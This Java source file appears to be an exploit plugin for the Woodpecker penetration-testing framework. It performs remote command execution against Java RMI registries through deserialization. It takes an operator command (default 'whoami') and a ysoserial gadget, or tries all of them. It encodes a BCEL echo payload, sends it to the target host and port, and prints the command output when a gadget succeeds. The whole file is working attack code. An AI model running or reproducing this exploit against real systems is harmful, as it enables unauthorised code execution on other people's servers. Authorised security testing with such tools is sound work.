package me.gv7.woodpecker.plugin.exploit;

import me.gv7.woodpecker.plugin.*;
import me.gv7.woodpecker.plugin.utils.CommonUtil;
import me.gv7.woodpecker.plugin.utils.RMIRegistryExploit;
import sun.misc.BASE64Encoder;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;

public class RmiDeserialExecExploit implements IExploit {
    @Override
    public String getExploitTabCaption() {
        return "Rmi 反序列化命令执行";
    }

    @Override
    public IArgsUsageBinder getExploitCustomArgs() {
        IArgsUsageBinder argsUsageBinder = JavaRMIVulPlugin.pluginHelper.createArgsUsageBinder();
        List<IArg> argsList = new ArrayList<IArg>();

        IArg args = JavaRMIVulPlugin.pluginHelper.createArg();
        args.setDescription("命令");
        args.setRequired(true);
        args.setDefaultValue("whoami");
        args.setName("command");
        argsList.add(args);


        IArg gadget = JavaRMIVulPlugin.pluginHelper.createArg();
        gadget.setDescription("ysoserial gadget");
        gadget.setRequired(true);
        gadget.setDefaultValue("all");
        gadget.setName("gadget");
        argsList.add(gadget);

        argsUsageBinder.setArgsList(argsList);
        return argsUsageBinder;
    }

    @Override
    public void doExploit(ITarget target, Map<String, Object> map, IResultOutput result) {
        String host = target.getHost();
        int port = target.getPort();
        String gadget = (String)map.get("gadget");
        String command = (String)map.get("command");

        if(gadget.equals("all")) {
            for (String gg : JavaRMIVulPlugin.gadgets) {
                String res = doEchoExploig(host,port,gg,command);
                if(res != null){
                    result.successPrintln(String.format("gadget: %s command: %s",gg,command));
                    result.rawPrintln(res+"\n\n");
                }else{
                    result.failPrintln(String.format("gadget: %s command: %s",gg,command));
                }
            }
        }else{
            String res = doEchoExploig(host,port,gadget,command);
            if(res != null){
                result.successPrintln(String.format("gadget: %s command: %s",gadget,command));
                result.rawPrintln(res+"\n\n");
            }else{
                result.failPrintln(String.format("gadget: %s command: %s",gadget,command));
            }
        }
    }

    public String doEchoExploig(String host,int port,String gadget,String command){
        String bcelStr = CommonUtil.getEchoExeCode(command);
        bcelStr = new BASE64Encoder().encode(bcelStr.getBytes());
        String res = null;
        try {
            Object objPayload = CommonUtil.generator(gadget, String.format("codebase64:%s", bcelStr));
            res = RMIRegistryExploit.sendPayload(host, port, objPayload);
        } catch (Throwable e) {
            e.printStackTrace();
        }
        return res;
    }
}
